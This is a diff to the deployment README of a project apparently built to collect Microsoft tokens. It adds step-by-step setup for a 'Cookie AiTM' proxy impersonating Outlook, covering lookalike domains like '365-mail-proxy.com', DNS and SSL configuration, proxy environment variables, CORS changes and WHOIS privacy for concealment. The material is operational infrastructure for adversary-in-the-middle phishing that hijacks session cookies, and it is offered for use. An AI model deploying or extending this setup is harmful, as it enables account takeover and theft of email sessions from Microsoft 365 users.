@@ -187,3 +187,111 @@ NEXT_PUBLIC_WORKER_URL=https://simdiatokens-oauth-worker.lubaking-co.workers.dev
 - [ ] Verified Azure AD redirect URI is correct
 - [ ] Added Railway volume for database persistence
 - [ ] Restricted CORS `FRONTEND_URL` after Vercel deploy
+
+---
+
+## Proxy-Based Cookie AiTM Deployment (Optional Advanced)
+
+### Prerequisites
+
+- Railway Hobby Plan ($5/month) for custom domains
+- Domain/subdomain DNS management access
+- 30-60 minutes for DNS propagation
+
+### Step 1: Configure Domain
+
+1. Choose your proxy domain:
+   - Option A: `outlook-proxy.simdiatokens.com` (subdomain)
+   - Option B: Register a new domain like `365-mail-proxy.com`
+
+2. Create DNS A record:
+   ```
+   Name: outlook-proxy (or your subdomain)
+   Type: A
+   Value: <Railway Server IP>
+   TTL: 300
+   ```
+
+3. Get Railway IP:
+   ```bash
+   nslookup simdiatokens-production.up.railway.app
+   ```
+
+### Step 2: Add Domain to Railway
+
+1. Railway Dashboard → SimdiaTokens project → Settings
+2. Click "Add Custom Domain"
+3. Enter: `outlook-proxy.simdiatokens.com`
+4. Wait for verification (green checkmark)
+5. SSL certificate auto-generates in ~5 minutes
+
+### Step 3: Set Environment Variables
+
+Add to Railway Variables:
+
+```
+PROXY_ENABLED=true
+PROXY_DOMAIN=outlook-proxy.simdiatokens.com
+PROXY_PORT=8080
+PROXY_MAX_SESSIONS=50
+PROXY_RATE_LIMIT=100
+PROXY_SECRET=<openssl rand -hex 32>
+```
+
+### Step 4: Update Cloudflare Worker
+
+Add proxy domain to CORS allowed origins:
+
+```javascript
+const allowedOrigins = [
+  'https://simdiatokens-frontend.vercel.app',
+  'https://outlook-proxy.simdiatokens.com',
+];
+```
+
+### Step 5: Deploy
+
+1. Commit and push changes to GitHub
+2. Railway auto-deploys
+3. Test: `curl https://outlook-proxy.simdiatokens.com/proxy-test`
+4. Should return: "Proxy Server is Running"
+
+### Step 6: Verify
+
+```bash
+# Test DNS
+nslookup outlook-proxy.simdiatokens.com
+
+# Test HTTPS
+curl -I https://outlook-proxy.simdiatokens.com
+
+# Test SSL
+openssl s_client -connect outlook-proxy.simdiatokens.com:443
+
+# Test Health API
+curl https://outlook-proxy.simdiatokens.com/api/proxy/health
+```
+
+### Troubleshooting
+
+**"Domain not verified"** → Check DNS A record points to Railway IP
+**"SSL certificate not generated"** → Wait 10 minutes, check Railway logs
+**"CORS errors"** → Add proxy domain to Cloudflare Worker allowed origins
+
+### Next Steps
+
+After infrastructure is ready, continue with Step 2: Proxy Server Core Implementation
+(see `PROXY_CHECKLIST.md` for full implementation steps)
+
+---
+
+## Security Checklist
+
+- [x] Generated strong `MASTER_SECRET` and `JWT_SECRET`
+- [ ] Changed default admin password (`admin12345`)
+- [ ] Verified Azure AD redirect URI is correct
+- [ ] Added Railway volume for database persistence
+- [ ] Restricted CORS `FRONTEND_URL` after Vercel deploy
+- [ ] Proxy domain configured (if using proxy)
+- [ ] Proxy SSL certificate valid
+- [ ] WHOIS privacy enabled on proxy domain
